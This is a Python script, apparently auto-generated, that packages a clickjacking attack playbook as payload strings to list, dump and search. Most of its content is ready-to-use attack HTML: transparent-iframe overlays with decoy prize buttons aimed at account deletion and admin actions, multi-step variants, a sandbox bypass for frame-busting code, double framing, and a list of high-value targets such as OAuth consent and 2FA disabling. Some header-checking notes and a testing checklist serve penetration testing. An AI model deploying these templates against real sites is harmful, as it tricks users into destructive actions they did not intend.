#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/clickjacking

Skill: SKILL: Clickjacking — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-clickjacking.py --help
      python hack-skills-clickjacking.py --list
      python hack-skills-clickjacking.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/clickjacking'
TITLE = 'SKILL: Clickjacking — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: clickjacking", "description: >-", "Clickjacking playbook. Use when testing whether target pages can be framed, whether X-Frame-Options or CSP frame-ancestors are properly configured, and whether UI redress attacks can trigger sensitive actions."],
    'skill-clickjacking-expert-attack-playbook': [],
    '1-core-concept': ["Clickjacking loads a target page in a transparent iframe overlaid on an attacker's page. The victim sees the attacker's UI but clicks on the invisible target page, performing unintended actions.", "```html", "<style>", "iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }", ".decoy { position: absolute; top: 200px; left: 100px; z-index: 1; }", "</style>", "<div class=\"decoy\"><button>Click to win a prize!</button></div>", "<iframe src=\"https://target.com/account/delete?confirm=yes\"></iframe>"],
    '2-detection-is-the-page-frameable': [],
    'check-x-frame-options-header': ["X-Frame-Options: DENY           \u2192 cannot be framed (secure)", "X-Frame-Options: SAMEORIGIN     \u2192 only same-origin framing (secure for cross-origin)", "X-Frame-Options: ALLOW-FROM uri \u2192 deprecated, browser support inconsistent", "(header absent)                  \u2192 frameable! (vulnerable)"],
    'check-csp-frame-ancestors': ["Content-Security-Policy: frame-ancestors 'none'        \u2192 cannot be framed", "Content-Security-Policy: frame-ancestors 'self'         \u2192 same-origin only", "Content-Security-Policy: frame-ancestors https://a.com  \u2192 specific origin", "(directive absent)                                       \u2192 frameable", "**CSP frame-ancestors supersedes X-Frame-Options** in modern browsers."],
    'quick-poc-test': ["```html", "<iframe src=\"https://target.com/sensitive-action\" width=\"800\" height=\"600\"></iframe>", "If the page loads in the iframe \u2192 frameable \u2192 potentially vulnerable."],
    'javascript-frame-detection-from-target-page-source': ["```javascript", "// Common frame-busting code found in target pages:", "if (top.location.hostname !== self.location.hostname) {", "top.location.href = self.location.href;", "If this code is present but not using CSP `frame-ancestors`, it can often be bypassed."],
    '3-proof-of-concept-templates': [],
    'basic-single-click': ["```html", "<html>", "<head><title>Free Prize</title></head>", "<body>", "<h1>Click the button to claim your prize!</h1>", "<style>", "iframe { position: absolute; top: 300px; left: 60px;", "width: 500px; height: 200px; opacity: 0.0001; z-index: 2; }", "</style>", "<iframe src=\"https://target.com/account/settings?action=delete\"></iframe>", "</body>", "</html>"],
    'multi-step-clickjacking': ["For actions requiring multiple clicks (e.g., \"Are you sure?\" confirmation):", "```html", "<div id=\"step1\">", "<button onclick=\"document.getElementById('step1').style.display='none';", "document.getElementById('step2').style.display='block';\">", "Step 1: Click here", "</button>", "</div>", "<div id=\"step2\" style=\"display:none\">", "<button>Step 2: Confirm</button>", "</div>", "<iframe src=\"https://target.com/admin/action\"></iframe>", "Reposition iframe for each step to align the transparent button with the decoy."],
    'drag-and-drop-clickjacking': ["Extract data from one iframe to another using HTML5 drag-and-drop events \u2014 the victim drags across invisible iframes, transferring tokens or data."],
    '4-bypass-techniques': [],
    'frame-busting-script-bypass': ["Some pages use JavaScript frame-busting:", "```javascript", "if (top !== self) { top.location = self.location; }", "**Bypass with sandbox attribute**:", "```html", "<iframe src=\"https://target.com\" sandbox=\"allow-forms allow-scripts\"></iframe>", "<!-- sandbox without allow-top-navigation prevents frame-busting -->"],
    'x-frame-options-allow-from-bypass': ["`ALLOW-FROM` is not supported in Chrome/Safari. If the server relies solely on `ALLOW-FROM`, modern browsers ignore it \u2192 page is frameable."],
    'double-framing': ["If `X-Frame-Options: SAMEORIGIN` is set, but a same-origin page exists that can be framed (without XFO), use that page as an intermediary to frame the target."],
    '5-high-impact-targets': ["```text", "Account deletion page", "Email/password change form", "Admin panel actions (add user, change role)", "Payment confirmation", "OAuth authorization (\"Allow\" button)", "Two-factor authentication disable", "API key generation", "Webhook configuration"],
    '6-testing-checklist': ["\u25a1 Check X-Frame-Options header on sensitive pages", "\u25a1 Check CSP frame-ancestors directive", "\u25a1 Create iframe PoC and verify page loads", "\u25a1 Test frame-busting scripts \u2014 try sandbox attribute bypass", "\u25a1 Identify high-value single-click actions", "\u25a1 For multi-step actions, build multi-click PoC", "\u25a1 Test both authenticated and unauthenticated pages", "\u25a1 Verify ALLOW-FROM behavior across browsers"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()